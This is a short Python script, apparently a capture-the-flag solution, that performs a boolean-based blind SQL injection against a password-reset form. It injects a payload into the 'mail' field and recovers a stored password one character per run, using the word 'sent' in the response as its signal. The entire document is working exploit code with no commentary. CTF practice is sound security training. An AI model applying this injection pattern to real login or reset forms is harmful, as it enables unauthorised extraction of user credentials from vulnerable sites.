#!/usr/bin/env python3

import sys
import string
import requests

BASE_URL = "http://pwdreset.wutctf.space/"
QUERY_FMT = "' OR BINARY '{char}'=(SELECT MID(password, {pos}, 1) FROM people LIMIT 1,1) #"
SUCCESS_MSG = "sent"

def oracle(s, c, pos):
    r = s.post(BASE_URL, data={'mail': QUERY_FMT.format(char=c, pos=pos)})
    return SUCCESS_MSG in r.text

def main():
    if len(sys.argv) != 2:
        sys.stderr.write('Usage: {} <position>\n'.format(sys.argv[0]))
        sys.exit(1)

    s = requests.Session()
    chars = string.ascii_letters + string.digits
    for c in chars:
        if oracle(s, c, int(sys.argv[1])):
            print(c)
            break

if __name__ == '__main__':
    main()